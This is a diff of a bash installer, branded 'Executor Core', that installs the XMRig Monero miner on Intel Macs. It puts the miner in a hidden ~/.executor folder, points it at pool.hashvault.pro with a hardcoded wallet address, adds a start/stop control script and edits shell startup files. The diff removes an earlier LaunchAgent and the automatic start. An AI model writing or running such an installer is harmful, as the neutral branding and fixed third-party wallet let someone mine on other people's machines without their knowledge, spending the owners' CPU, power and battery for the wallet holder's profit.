@@ -1,74 +1,88 @@
-```bash
+
 #!/bin/bash
 set -euo pipefail
 
+# ==========================================
+# EXECUTOR CORE v6.1 — INTEL EDITION
+# Homebrew-free macOS installer
+# ==========================================
+
 VERSION="6.26.0"
+ASSET="xmrig-${VERSION}-macos-x64.tar.gz"
+HASH="1da924b358c0089e361540c4a9e6f8b09538b29efeafa2379590e0f6db358ff4"
 WALLET="43qUaFUkE2KB4qLHALW6H5bPWPSdnn7F4GCzEVyX7CbZCtEmjycx8z2d7ts63ekU7HNXFgsrWgYJkauXXwtcFSXx5cUYF6E"
 
 BASE="$HOME/.executor"
 BIN="$BASE/bin"
 CONFIG="$HOME/.config/xmrig"
-AGENTS="$HOME/Library/LaunchAgents"
-LABEL="com.executor.xmrig"
-PLIST="$AGENTS/$LABEL.plist"
 EXECUTOR="$BIN/executor"
 
-mkdir -p "$BIN" "$CONFIG" "$AGENTS"
+G='\033[1;32m'
+LG='\033[0;92m'
+D='\033[2;32m'
+R='\033[0m'
 
-echo "Executor Core — Homebrew-free installer"
-echo "----------------------------------------"
+banner() {
+    printf "${G}"
+    echo '███████╗██╗  ██╗███████╗ ██████╗'
+    echo '██╔════╝╚██╗██╔╝██╔════╝██╔════╝'
+    echo '█████╗   ╚███╔╝ █████╗  ██║'
+    echo '██╔══╝   ██╔██╗ ██╔══╝  ██║'
+    echo '███████╗██╔╝ ██╗███████╗╚██████╗'
+    echo '╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝'
+    printf "${R}"
+    printf "${LG}       EXECUTOR CORE v6.1${R}\n"
+    printf "${D}       INTEL EDITION${R}\n\n"
+}
 
-ARCH="$(uname -m)"
-case "$ARCH" in
-  arm64)
-    ASSET="xmrig-${VERSION}-macos-arm64.tar.gz"
-    HASH="6ae4eb4216e99a201ae9a3d2c3a7c275207c5165cfc25da1f3d735d6c4829c18"
-    ;;
-  x86_64)
-    ASSET="xmrig-${VERSION}-macos-x64.tar.gz"
-    HASH="1da924b358c0089e361540c4a9e6f8b09538b29efeafa2379590e0f6db358ff4"
-    ;;
-  *)
-    echo "Unsupported Mac architecture: $ARCH"
+banner
+
+# Intel-only check
+if [[ "$(uname -m)" != "x86_64" ]]; then
+    echo "ERROR: This installer is for Intel Macs only."
     exit 1
-    ;;
-esac
+fi
 
-echo "Detected: $ARCH"
+echo "[OK] Intel architecture detected."
+
+mkdir -p "$BIN" "$CONFIG"
 
 TMP="$(mktemp -d)"
 trap 'rm -rf "$TMP"' EXIT
 
 URL="https://github.com/xmrig/xmrig/releases/download/v${VERSION}/${ASSET}"
 
-echo "Downloading official XMRig release..."
+echo
+echo "[1/5] Downloading official XMRig release..."
 curl -fL --retry 3 "$URL" -o "$TMP/$ASSET"
 
-echo "Checking download integrity..."
+echo "[2/5] Verifying SHA-256..."
 ACTUAL="$(shasum -a 256 "$TMP/$ASSET" | awk '{print $1}')"
 
 if [[ "$ACTUAL" != "$HASH" ]]; then
-  echo "SHA-256 check failed. Nothing was installed."
-  exit 1
+    echo "ERROR: SHA-256 verification failed."
+    exit 1
 fi
 
-echo "Extracting..."
+echo "[OK] Download verified."
+
+echo "[3/5] Extracting XMRig..."
 tar -xzf "$TMP/$ASSET" -C "$TMP"
 
 XMRIG="$(find "$TMP" -type f -name xmrig -print -quit)"
 
 if [[ -z "$XMRIG" ]]; then
-  echo "Could not find the XMRig executable in the archive."
-  exit 1
+    echo "ERROR: XMRig executable not found."
+    exit 1
 fi
 
 install -m 755 "$XMRIG" "$BIN/xmrig"
 
-echo "Configuring wallet..."
+echo "[4/5] Preparing configuration..."
 
 cat > "$CONFIG/config.json" <<EOF
 {
-  "autosave": true,
+  "autosave": false,
   "background": false,
   "colors": false,
   "title": false,
@@ -76,11 +90,13 @@ cat > "$CONFIG/config.json" <<EOF
   "print-time": 60,
   "pools": [
     {
+      "coin": "monero",
       "url": "pool.hashvault.pro:443",
       "user": "$WALLET",
       "pass": "macbook-worker",
+      "tls": true,
       "keepalive": true,
-      "tls": true
+      "enabled": true
     }
   ]
 }
@@ -88,105 +104,211 @@ EOF
 
 chmod 600 "$CONFIG/config.json"
 
-cat > "$PLIST" <<EOF
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-  <key>Label</key>
-  <string>$LABEL</string>
-
-  <key>ProgramArguments</key>
-  <array>
-    <string>$BIN/xmrig</string>
-    <string>--config=$CONFIG/config.json</string>
-    <string>--threads=2</string>
-    <string>--cpu-priority=1</string>
-  </array>
-
-  <key>RunAtLoad</key>
-  <false/>
-
-  <key>KeepAlive</key>
-  <false/>
-
-  <key>StandardOutPath</key>
-  <string>$BASE/xmrig.log</string>
-
-  <key>StandardErrorPath</key>
-  <string>$BASE/xmrig-error.log</string>
-</dict>
-</plist>
-EOF
+echo "[5/5] Creating management utility..."
 
 cat > "$EXECUTOR" <<'CONTROL'
 #!/bin/bash
+set -euo pipefail
 
-LABEL="com.executor.xmrig"
 BASE="$HOME/.executor"
-PLIST="$HOME/Library/LaunchAgents/$LABEL.plist"
-UID_NUM="$(id -u)"
-TARGET="gui/$UID_NUM/$LABEL"
+BIN="$BASE/bin"
+CONFIG="$HOME/.config/xmrig"
+PIDFILE="$BASE/xmrig.pid"
+LOG="$BASE/xmrig.log"
+ERRLOG="$BASE/xmrig-error.log"
+XMRIG="$BIN/xmrig"
 
-case "${1:-}" in
-  start)
-    if launchctl print "$TARGET" >/dev/null 2>&1; then
-      launchctl kickstart -k "$TARGET"
-    else
-      launchctl bootstrap "gui/$UID_NUM" "$PLIST"
-      launchctl kickstart "$TARGET"
-    fi
-    echo "Executor started in the background."
-    ;;
+is_running() {
+    [[ -f "$PIDFILE" ]] || return 1
 
-  stop)
-    launchctl bootout "gui/$UID_NUM" "$PLIST" 2>/dev/null || true
-    echo "Executor stopped."
-    ;;
+    PID="$(cat "$PIDFILE")"
 
-  restart)
-    launchctl bootout "gui/$UID_NUM" "$PLIST" 2>/dev/null || true
-    launchctl bootstrap "gui/$UID_NUM" "$PLIST"
-    launchctl kickstart "$TARGET"
-    echo "Executor restarted."
-    ;;
+    [[ "$PID" =~ ^[0-9]+$ ]] || return 1
+    kill -0 "$PID" 2>/dev/null || return 1
 
-  status)
-    if pgrep -f "$HOME/.executor/bin/xmrig" >/dev/null; then
-      echo "Executor is running."
-      pgrep -fl "$HOME/.executor/bin/xmrig"
-    else
-      echo "Executor is stopped."
-    fi
-    ;;
+    ps -p "$PID" -o command= 2>/dev/null |
+        grep -Fq "$XMRIG"
+}
 
-  logs)
-    tail -n 40 -f "$BASE/xmrig.log"
-    ;;
+case "${1:-help}" in
 
-  uninstall)
-    launchctl bootout "gui/$UID_NUM" "$PLIST" 2>/dev/null || true
-    rm -f "$PLIST" "$BASE/bin/xmrig" "$BASE/bin/executor"
-    rm -rf "$HOME/.config/xmrig"
-    echo "Executor removed. Log files were kept in $BASE."
-    ;;
+    start)
+        if is_running; then
+            echo "[EXECUTOR] Already running."
+            exit 0
+        fi
 
-  *)
-    echo "Usage: executor {start|stop|restart|status|logs|uninstall}"
-    ;;
+        rm -f "$PIDFILE"
+
+        if [[ ! -x "$XMRIG" ]]; then
+            echo "[EXECUTOR] XMRig executable missing."
+            exit 1
+        fi
+
+        mkdir -p "$BASE"
+        touch "$LOG" "$ERRLOG"
+
+        echo "[EXECUTOR] Starting manually..."
+
+        nohup "$XMRIG" \
+            --config="$CONFIG/config.json" \
+            --threads=2 \
+            --cpu-priority=1 \
+            >> "$LOG" 2>> "$ERRLOG" < /dev/null &
+
+        echo "$!" > "$PIDFILE"
+
+        sleep 2
+
+        if is_running; then
+            echo "[EXECUTOR] Running in background."
+        else
+            rm -f "$PIDFILE"
+            echo "[EXECUTOR] Startup failed. Check logs."
+            exit 1
+        fi
+        ;;
+
+    stop)
+        if ! is_running; then
+            rm -f "$PIDFILE"
+            echo "[EXECUTOR] Already stopped."
+            exit 0
+        fi
+
+        PID="$(cat "$PIDFILE")"
+        kill -TERM "$PID"
+
+        echo "[EXECUTOR] Waiting for shutdown..."
+
+        for i in {1..10}; do
+            if ! kill -0 "$PID" 2>/dev/null; then
+                break
+            fi
+            sleep 1
+        done
+
+        if kill -0 "$PID" 2>/dev/null; then
+            echo "[EXECUTOR] Process has not exited yet."
+            exit 1
+        fi
+
+        rm -f "$PIDFILE"
+        echo "[EXECUTOR] Stopped."
+        ;;
+
+    restart)
+        "$0" stop
+        sleep 1
+        "$0" start
+        ;;
+
+    status)
+        echo
+        echo "========== EXECUTOR STATUS =========="
+
+        if is_running; then
+            PID="$(cat "$PIDFILE")"
+            echo "Status: RUNNING"
+            ps -p "$PID" -o pid=,pcpu=,pmem=,etime=
+        else
+            echo "Status: STOPPED"
+        fi
+
+        echo "Architecture: $(uname -m)"
+        echo "Version: 6.1 Intel Edition"
+        echo "====================================="
+        ;;
+
+    logs)
+        touch "$LOG" "$ERRLOG"
+        tail -n 40 -f "$LOG" "$ERRLOG"
+        ;;
+
+    power)
+        pmset -g batt
+        ;;
+
+    monitor)
+        if is_running; then
+            PID="$(cat "$PIDFILE")"
+            ps -p "$PID" -o pid=,pcpu=,pmem=,etime=,command=
+        else
+            echo "[EXECUTOR] No running process."
+        fi
+        ;;
+
+    uninstall)
+        echo "This removes EXECUTOR and its configuration."
+        read -r -p "Continue? (y/N): " ANSWER
+
+        if [[ "$ANSWER" != "y" && "$ANSWER" != "Y" ]]; then
+            echo "Cancelled."
+            exit 0
+        fi
+
+        "$0" stop || true
+        rm -rf "$BASE" "$CONFIG"
+
+        echo "[EXECUTOR] Uninstalled."
+        ;;
+
+    help|*)
+        echo
+        echo "EXECUTOR CORE v6.1 — INTEL EDITION"
+        echo
+        echo "Commands:"
+        echo "  executor start      Start manually"
+        echo "  executor stop       Stop"
+        echo "  executor restart    Restart manually"
+        echo "  executor status     Show status"
+        echo "  executor logs       View logs"
+        echo "  executor monitor    Show resource usage"
+        echo "  executor power      Show battery status"
+        echo "  executor uninstall  Remove installation"
+        echo
+        ;;
 esac
 CONTROL
 
-chmod +x "$EXECUTOR"
+chmod 755 "$EXECUTOR"
 
-echo ""
-echo "Installation complete!"
-echo "Start:     $EXECUTOR start"
-echo "Stop:      $EXECUTOR stop"
-echo "Status:    $EXECUTOR status"
-echo "Logs:      $EXECUTOR logs"
-echo "Uninstall: $EXECUTOR uninstall"
-echo ""
-echo "Starting Executor..."
-"$EXECUTOR" start
-```
+# Add command to shell PATH
+for RC in "$HOME/.zshrc" "$HOME/.bashrc"; do
+    touch "$RC"
+    if ! grep -Fq '.executor/bin' "$RC"; then
+        printf '\nexport PATH="$HOME/.executor/bin:$PATH"\n' >> "$RC"
+    fi
+done
+
+export PATH="$BIN:$PATH"
+
+echo
+printf "${G}==========================================${R}\n"
+printf "${LG}       EXECUTOR CORE v6.1${R}\n"
+printf "${LG}       INSTALLATION COMPLETE${R}\n"
+printf "${G}==========================================${R}\n"
+
+echo
+echo "Architecture: Intel x86_64"
+echo "XMRig:        $BIN/xmrig"
+echo "Configuration: $CONFIG/config.json"
+echo "Control:      $EXECUTOR"
+echo
+echo "Commands:"
+echo "  executor start"
+echo "  executor stop"
+echo "  executor restart"
+echo "  executor status"
+echo "  executor logs"
+echo "  executor monitor"
+echo "  executor power"
+echo "  executor uninstall"
+echo
+echo "Open a new Terminal window or run:"
+echo "  source ~/.zshrc"
+echo
+echo "Mining is NOT started automatically."
+echo "Use 'executor start' when you explicitly want to begin."
+echo
+echo "EXECUTOR INITIALIZATION FINISHED."
